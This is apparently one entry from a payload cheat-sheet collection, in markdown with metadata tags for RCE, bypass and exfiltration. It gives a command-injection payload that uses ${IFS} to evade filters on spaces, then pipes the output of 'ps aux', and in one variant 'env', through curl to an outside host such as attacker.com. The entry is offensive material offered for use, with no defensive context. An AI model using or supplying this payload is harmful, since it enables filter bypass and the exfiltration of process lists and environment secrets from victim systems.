---
id: c3f4g5h6-i7j8-9013-ef01-234567890123
data: 'ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-'
tags:
  - rce
  - bypass
  - exfiltration
type: command
output: 'Same as above: HTTP POST with process list'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:14.477Z'
verified: false
validated: true
submitted: true
---
# ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@- 

## Command

```bash
ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@- 
```

## Description

Variant of process listing and exfiltration using ${IFS} (Internal Field Separator) to insert spaces, bypassing potential filters on literal spaces in injected payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ${IFS} | Shell variable for space/tab insertion | Yes (for bypass) |
| http://<your-server> | Exfil target | Yes |
| -d | POST data flag | Yes |
| @- | Stdin input | Yes |

## Examples

### Basic Usage

```bash
ps${IFS}aux|curl${IFS}http://attacker.com${IFS}-d${IFS}@- 
```

### Advanced Usage

```bash
env${IFS} | ps${IFS}aux|curl${IFS}http://attacker.com${IFS}-d${IFS}@- 
```

## Expected Output

Piped execution sends process list via POST to server.

## Related

- [[commands/ps-aux-exfil]]
